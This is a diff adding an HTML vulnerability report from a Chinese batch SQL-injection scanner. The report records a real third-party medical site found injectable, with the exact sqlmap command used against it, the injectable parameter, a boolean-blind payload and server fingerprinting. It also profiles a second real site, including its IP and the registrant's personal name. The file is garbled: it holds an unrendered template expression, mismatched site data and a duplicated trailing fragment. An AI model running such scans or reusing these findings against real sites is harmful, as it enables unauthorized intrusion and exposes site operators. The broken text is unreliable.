@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>LAnGZi SQL Injection Report Version 3.8</title>
+    <link rel="stylesheet" href='https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap-theme.min.css'>
+    <link rel="stylesheet" href='https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css'>
+</head>
+<div class="container">
+    <div class="navbar navbar-default">
+        <div class="navbar-header">
+            <a class="navbar-brand" href="#">LAnGZi</a>
+        </div>
+        <ul class="nav navbar-nav">
+            <li><a href="http://www.langzi.fun/Python%20%E6%89%B9%E9%87%8FSQL%E6%B3%A8%E5%85%A5%E6%89%AB%E6%8F%8F.html">项目地址</a>
+            </li>
+            <li>
+                <a href="http://www.langzi.fun/%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF.html">可拓展信息处理</a>
+            </li>
+            <li>
+                <a href="http://www.langzi.fun/Python%20%E6%89%AB%E6%8F%8FIP%E4%BB%A3%E7%90%86%E6%B1%A0.html">可拓展IP代理池</a>
+            </li>
+        </ul>
+
+    </div>
+</div>
+
+
+
+
+
+
+
+<div class="col-md-12 font-weight-bold"><br>
+
+
+    <div class="panel panel-primary">
+        <div class="panel-heading">
+            网站漏洞报表
+        </div>
+        <div class="panel-body">
+            <table class="table">
+
+                <tr>
+                    <td>发现时间</td>
+                    <td>2019-03-12:18:55:03</td>
+                </tr>
+
+
+                <tr>
+                    <td>网站标题</td>
+                    <td>奇点-链接全球创新医疗</td>
+                </tr>
+
+                (inj.replace('Parameter: ', '<tr><td>注入参数(方式)</td><td> ').replace('Type: ', '</td></tr><tr><td>注入方式</td><td>').replace
+                ('Title: ','</td></tr><tr><td>注入标题</td><td>').replace(
+                        'Payload: ', '</td></tr><tr><td>注入攻击</td><td>'))
+
+
+
+
+
+
+                <tr>
+                    <td>注入网址</td>
+                    <td>http://geekheal.com/video-original.php?id=6</td>
+                </tr>
+                <tr>
+                    <td>执行命令</td>
+                    <td>D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe
+                        D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u
+                        http://geekheal.com/video-original.php?id=6 --technique B --batch --thread=10 --random-agent
+                    </td>
+                </tr>
+                <tr>
+                    <td>注入参数(方式)</td>
+                    <td>id (GET)</td>
+                </tr>
+                <tr>
+                    <td>注入方式</td>
+                    <td>boolean-based blind</td>
+                </tr>
+                <tr>
+                    <td>注入标题</td>
+                    <td>AND boolean-based blind - WHERE or HAVING clause</td>
+                </tr>
+                <tr>
+                    <td>注入攻击</td>
+                    <td>id=6 AND 6743=6743</td>
+                </tr>
+                <tr>
+                    <td>数据库类型</td>
+                    <td>MySQL</td>
+                </tr>
+                <tr>
+                    <td>服务器版本</td>
+                    <td>Linux Ubuntu</td>
+                </tr>
+                <tr>
+                    <td>服务器语言</td>
+                    <td>Nginx 1.10.3</td>
+                </tr>
+            </table>
+        </div>
+
+
+        <div class="panel-footer">
+            网站信息报表
+        </div>
+
+        <div class="panel-body">
+
+            <table class="table">
+
+                <tr>
+                    <td>百度权重</td>
+                    <td>7</td>
+                </tr>
+                <tr>
+                    <td>网站主页</td>
+                    <td>https://www.52pojie.cn</td>
+                </tr>
+                <tr>
+                    <td>网站标题</td>
+                    <td>吾爱破解 - LCG - LSG|安卓破解|病毒分析|破解软件|www.52pojie.cn</td>
+                </tr>
+                <tr>
+                    <td>IP__坐标</td>
+                    <td>香港 深圳市腾讯计算机系统有限公司IDC机房(BGP)</td>
+                </tr>
+                <tr>
+                    <td>所属__IP</td>
+                    <td>203.195.149.17</td>
+                </tr>
+                <tr>
+                    <td>网站年龄</td>
+                    <td>11年24天（创建于2008年03月11日,过期时间为2022年03月11日)</td>
+                </tr>
+                <tr>
+                    <td>备案编号</td>
+                    <td>京ICP备16042023号-1</td>
+                </tr>
+                <tr>
+                    <td>备案性质</td>
+                    <td>个人</td>
+                </tr>
+                <tr>
+                    <td>备案名称</td>
+                    <td>闻功岭</td>
+                </tr>
+                <tr>
+                    <td>备案时间</td>
+                    <td>2017/11/20 0:00:00</td>
+                </tr>
+                <tr>
+                    <td>百度收录</td>
+                    <td>105万</td>
+                </tr>
+                <tr>
+                    <td>协议类型</td>
+                    <td>HTTP/1.1 200 OK</td>
+                </tr>
+                <tr>
+                    <td>页面类型</td>
+                    <td>text/html; charset=gbk</td>
+                </tr>
+                <tr>
+                    <td>服务类型</td>
+                    <td>360wzws</td>
+                </tr>
+                <tr>
+                    <td>程序语言</td>
+                    <td>暂无信息</td>
+                </tr>
+            </table>
+
+        </div>
+
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    id (GET)</td>
+                </tr>
+                <tr>
+                    <td>注入方式</td>
+                    <td>boolean-based blind</td>
+                </tr>
+                <tr>
+                    <td>注入标题</td>
+                    <td>AND boolean-based blind - WHERE or HAVING clause</td>
+                </tr>
+                <tr>
+                    <td>注入攻击</td>
+                    <td>id=6 AND 6743=6743</td>
+                </tr>
+                <tr>
+                    <td>数据库类型</td>
+                    <td>MySQL</td>
+                </tr>
+                <tr>
+                    <td>服务器版本</td>
+                    <td>Linux Ubuntu</td>
+                </tr>
+                <tr>
+                    <td>服务器语言</td>
+                    <td>Nginx 1.10.3</td>
+                </tr>
+
+
+
+
+
+
+
